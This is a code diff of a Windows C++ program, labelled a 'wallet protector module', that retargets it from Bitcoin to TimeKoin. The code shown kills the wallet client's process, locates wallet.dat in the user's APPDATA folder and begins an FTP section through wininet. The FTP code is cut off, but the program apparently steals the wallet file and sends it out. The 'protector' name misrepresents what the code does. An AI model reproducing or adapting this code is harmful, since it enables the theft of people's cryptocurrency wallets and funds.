@@ -6,7 +6,7 @@
 #include <iostream>
 #pragma comment(lib, "wininet")
 
-// BITCOIN WALLET PROTECTOR MODULE
+// TIMEKOIN WALLET PROTECTOR MODULE
 
 void killprocess()
 	{    
@@ -17,7 +17,7 @@ void killprocess()
 		BOOL Return = FALSE;
 		Return = Process32First( hProcessSnapShot,&ProcessEntry );
 
-		int value = _tcsicmp(ProcessEntry.szExeFile, _T("bitcoin.exe"));
+		int value = _tcsicmp(ProcessEntry.szExeFile, _T("timekoin.exe"));
 		if (value==0) 
 			{ 
 				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID); 
@@ -45,7 +45,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 											
 	
 	char* appdata = getenv("APPDATA");	
-	char* truepath = strcat(appdata, "\\Bitcoin\\wallet.dat"); 
+	char* truepath = strcat(appdata, "\\TimeKoin\\wallet.dat"); 
 
 	//ftp
 	HINTERNET hInternet;
